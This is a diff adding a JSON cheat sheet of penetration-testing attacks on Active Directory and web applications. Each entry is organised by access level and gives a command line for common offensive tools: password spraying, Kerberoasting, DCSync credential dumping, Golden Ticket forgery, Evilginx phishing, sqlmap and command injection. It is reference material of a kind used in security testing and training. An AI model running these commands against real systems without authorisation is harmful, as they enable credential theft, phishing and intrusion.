@@ -1,0 +1,245 @@
+[
+  {
+    "domain": "Active Directory",
+    "access_level": "No Access",
+    "attack": "Password spraying",
+    "description": "Brute-force weak passwords across multiple accounts to avoid account lockout.",
+    "tool": "CrackMapExec",
+    "command": "crackmapexec smb 10.0.0.0/24 -u users.txt -p passwords.txt --continue-on-success",
+    "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "No Access",
+    "attack": "Password spraying",
+    "description": "Brute-force weak passwords across multiple accounts to avoid account lockout.",
+    "tool": "Hydra",
+    "command": "hydra -L users.txt -P passwords.txt ldap://10.0.0.1",
+    "link": "https://www.kali.org/tools/hydra/"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "No Access",
+    "attack": "AS-REP Roasting",
+    "description": "Request TGTs for users with pre-auth disabled to extract and crack password hashes offline.",
+    "tool": "Rubeus",
+    "command": "Rubeus.exe asreproast",
+    "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/as-rep-roasting"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "No Access",
+    "attack": "AS-REP Roasting",
+    "description": "Request TGTs for users with pre-auth disabled to extract and crack password hashes offline.",
+    "tool": "Impacket - GetNPUsers",
+    "command": "GetNPUsers.py example.com/ -no-pass -usersfile users.txt",
+    "link": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "No Access",
+    "attack": "Subdomain enumeration",
+    "description": "Discover subdomains using passive or active DNS enumeration techniques.",
+    "tool": "Sublist3r",
+    "command": "sublist3r -d example.com",
+    "link": "https://github.com/aboul3la/Sublist3r"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "No Access",
+    "attack": "Subdomain enumeration",
+    "description": "Discover subdomains using passive or active DNS enumeration techniques.",
+    "tool": "Amass",
+    "command": "amass enum -d example.com",
+    "link": "https://github.com/owasp-amass/amass"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "No Access",
+    "attack": "Phishing campaigns",
+    "description": "Trick users into providing credentials or running malicious files via crafted emails or links.",
+    "tool": "Gophish",
+    "command": "Use Gophish dashboard to create campaign & send payloads",
+    "link": "https://getgophish.com/"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "No Access",
+    "attack": "Phishing campaigns",
+    "description": "Trick users into providing credentials or running malicious files via crafted emails or links.",
+    "tool": "Evilginx2",
+    "command": "sudo ./evilginx -p ./phishlets/office365.yaml",
+    "link": "https://github.com/kgretzky/evilginx2"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "No Access",
+    "attack": "Phishing campaigns",
+    "description": "Trick users into providing credentials or running malicious files via crafted emails or links.",
+    "tool": "SET Toolkit",
+    "command": "setoolkit # \u2192 Social Engineering Attacks \u2192 Credential Harvester",
+    "link": "https://github.com/trustedsec/social-engineer-toolkit"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "User Level Access",
+    "attack": "Kerberoasting",
+    "description": "Extract and crack service account hashes from Kerberos tickets to escalate privileges.",
+    "tool": "Rubeus",
+    "command": "Rubeus.exe kerberoast /user:targetuser /domain:example.com /rc4opsec",
+    "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "User Level Access",
+    "attack": "Kerberoasting",
+    "description": "Extract and crack service account hashes from Kerberos tickets to escalate privileges.",
+    "tool": "Impacket - GetUserSPNs",
+    "command": "python GetUserSPNs.py domain/user:password -dc-ip 10.0.0.1 -request",
+    "link": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "User Level Access",
+    "attack": "ACL enumeration",
+    "description": "Enumerate Active Directory object permissions to identify privilege escalation paths.",
+    "tool": "BloodHound",
+    "command": "SharpHound.exe -c All",
+    "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "User Level Access",
+    "attack": "ACL enumeration",
+    "description": "Enumerate Active Directory object permissions to identify privilege escalation paths.",
+    "tool": "ADExplorer",
+    "command": "Manual GUI-based inspection of AD structure",
+    "link": "https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "Admin Level Access",
+    "attack": "DCSync Attack",
+    "description": "Abuse domain replication privileges to dump credentials from a domain controller.",
+    "tool": "Mimikatz",
+    "command": "lsadump::dcsync /domain:example.com /user:krbtgt",
+    "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "Admin Level Access",
+    "attack": "DCSync Attack",
+    "description": "Abuse domain replication privileges to dump credentials from a domain controller.",
+    "tool": "Impacket - secretsdump",
+    "command": "secretsdump.py domain/admin:password@dc-ip",
+    "link": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py"
+  },
+  {
+    "domain": "Active Directory",
+    "access_level": "Admin Level Access",
+    "attack": "Golden Ticket Attack",
+    "description": "Forge Kerberos TGTs using KRBTGT hash for persistent access.",
+    "tool": "Mimikatz",
+    "command": "kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-XXXXX /krbtgt:NTLM_HASH /ptt",
+    "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket"
+  },
+  {
+    "domain": "Web Application Security",
+    "access_level": "Black-box (no credentials)",
+    "attack": "SQL Injection",
+    "description": "Inject SQL code into queries via input fields to access or manipulate databases.",
+    "tool": "sqlmap",
+    "command": "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
+    "link": "https://github.com/sqlmapproject/sqlmap"
+  },
+  {
+    "domain": "Web Application Security",
+    "access_level": "Black-box (no credentials)",
+    "attack": "SQL Injection",
+    "description": "Inject SQL code into queries via input fields to access or manipulate databases.",
+    "tool": "NoSQLMap",
+    "command": "nosqlmap -u 'http://target.com/login'",
+    "link": "https://github.com/codingo/NoSQLMap"
+  },
+  {
+    "domain": "Web Application Security",
+    "access_level": "Black-box (no credentials)",
+    "attack": "Directory brute-forcing",
+    "description": "Guess hidden paths and resources on web servers using wordlists.",
+    "tool": "Gobuster",
+    "command": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+    "link": "https://github.com/OJ/gobuster"
+  },
+  {
+    "domain": "Web Application Security",
+    "access_level": "Black-box (no credentials)",
+    "attack": "Directory brute-forcing",
+    "description": "Guess hidden paths and resources on web servers using wordlists.",
+    "tool": "Dirsearch",
+    "command": "python3 dirsearch.py -u http://target.com",
+    "link": "https://github.com/maurosoria/dirsearch"
+  },
+  {
+    "domain": "Web Application Security",
+    "access_level": "Authenticated (user)",
+    "attack": "IDOR",
+    "description": "Access unauthorized data by manipulating object references like user IDs or filenames.",
+    "tool": "Burp Suite",
+    "command": "Use Burp Repeater to test object ID tampering in endpoints",
+    "link": "https://portswigger.net/web-security/access-control/idor"
+  },
+  {
+    "domain": "Web Application Security",
+    "access_level": "Authenticated (user)",
+    "attack": "IDOR",
+    "description": "Access unauthorized data by manipulating object references like user IDs or filenames.",
+    "tool": "ffuf",
+    "command": "ffuf -u http://target.com/profile?id=FUZZ -w users.txt",
+    "link": "https://github.com/ffuf/ffuf"
+  },
+  {
+    "domain": "Web Application Security",
+    "access_level": "Authenticated (user)",
+    "attack": "Stored XSS",
+    "description": "Inject persistent malicious scripts into web pages viewed by other users.",
+    "tool": "XSStrike",
+    "command": "xsstrike -u http://target.com/comment",
+    "link": "https://github.com/s0md3v/XSStrike"
+  },
+  {
+    "domain": "Web Application Security",
+    "access_level": "Authenticated (user)",
+    "attack": "Stored XSS",
+    "description": "Inject persistent malicious scripts into web pages viewed by other users.",
+    "tool": "Burp Suite",
+    "command": "Inject payloads via Burp Repeater, use DOM Invader to test sinks",
+    "link": "https://portswigger.net/web-security/cross-site-scripting"
+  },
+  {
+    "domain": "Web Application Security",
+    "access_level": "Admin Access",
+    "attack": "RCE via Admin Panel",
+    "description": "Execute system commands remotely by exploiting vulnerable admin interfaces.",
+    "tool": "Commix",
+    "command": "commix --url='http://target.com/admin?cmd=ls'",
+    "link": "https://github.com/commixproject/commix"
+  },
+  {
+    "domain": "Web Application Security",
+    "access_level": "Admin Access",
+    "attack": "RCE via Admin Panel",
+    "description": "Execute system commands remotely by exploiting vulnerable admin interfaces.",
+    "tool": "Burp Suite",
+    "command": "Test injection in form fields or parameters with system commands",
+    "link": "https://book.hacktricks.xyz/pentesting-web/command-injection"
+  },
+  {
+    "domain": null,
+    "access_level": null,
+    "attack": null,
+    "description": null,
+    "tool": null,
+    "command": null,
+    "link": null
+  }
+]
